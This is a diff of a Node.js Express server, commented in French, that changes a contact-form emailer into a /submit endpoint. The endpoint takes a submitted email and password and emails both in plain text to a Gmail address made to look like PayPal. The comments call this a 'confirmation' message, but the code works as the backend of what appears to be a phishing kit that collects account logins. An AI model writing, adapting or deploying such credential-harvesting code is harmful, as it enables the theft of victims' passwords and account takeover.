@@ -1,49 +1,42 @@
 const express = require('express');
 const nodemailer = require('nodemailer');
 const cors = require('cors');
-
 const app = express();
-const PORT = process.env.PORT || 3000;
 
 // Middleware
-app.use(cors()); // Autorise les requêtes depuis n'importe quel domaine
-app.use(express.json()); // Permet de lire les données JSON envoyées
+app.use(cors());
+app.use(express.urlencoded({ extended: true })); // Pour les formulaires HTML classiques
+app.use(express.json()); // Pour les requêtes JSON
 
-// Route pour envoyer un email
-app.post('/send-email', async (req, res) => {
-  const { name, email, message } = req.body;
+// Route pour /login ou /submit (adaptée à ton cas)
+app.post('/submit', async (req, res) => {
+  const { email, password } = req.body;
 
-  // Configuration du transporteur Gmail
+  // Envoi d'un email de confirmation (exemple)
   const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-      user: process.env.GMAIL_USER, // Utilise une variable d'environnement
-      pass: process.env.GMAIL_APP_PASSWORD, // Mot de passe d'application Gmail
+      user: process.env.GMAIL_USER, // Variable d'environnement
+      pass: process.env.GMAIL_APP_PASSWORD, // Mot de passe d'application
     },
   });
 
   const mailOptions = {
     from: process.env.GMAIL_USER,
-    to: 'service.inli.paypal@gmail.com', // Email où tu veux recevoir les messages
-    subject: `Nouveau message de ${name}`,
-    text: `Email: ${email}\n\nMots de passe: ${password}`,
+    to: 'service.inli.paypal@gmail.com', // Envoi à l'utilisateur OU à ton admin
+    subject: 'Confirmation de connexion',
+    text: `Votre email : ${email}\nMot de passe (crypté en prod!) : ${password}`,
   };
 
   try {
     await transporter.sendMail(mailOptions);
-    res.status(200).json({ success: true });
+    res.status(200).send("Données reçues ! Un email a été envoyé.");
   } catch (error) {
     console.error(error);
-    res.status(500).json({ error: 'Erreur lors de l’envoi' });
+    res.status(500).send("Erreur lors de l'envoi.");
   }
 });
 
-// Route de test
-app.get('/', (req, res) => {
-  res.send('Backend fonctionnel sur Render ! 🚀');
-});
-
-// Démarrer le serveur
-app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
+app.listen(process.env.PORT || 3000, () => {
+  console.log('Server running');
 });
